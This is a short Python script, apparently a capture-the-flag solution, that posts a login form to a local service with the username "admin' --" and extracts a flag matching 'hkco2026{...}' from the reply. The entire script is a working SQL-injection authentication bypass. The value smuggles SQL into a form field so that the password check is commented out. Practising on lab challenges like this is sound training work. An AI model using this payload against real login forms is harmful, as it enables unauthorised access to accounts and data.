import re
import sys
import urllib.parse
import urllib.request

URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:35007/"

data = urllib.parse.urlencode({
    "username": "admin' --",
    "password": "anything",
}).encode()

resp = urllib.request.urlopen(URL, data=data).read().decode()
match = re.search(r"hkco2026\{[^}]*\}", resp)
print(match.group(0) if match else resp)
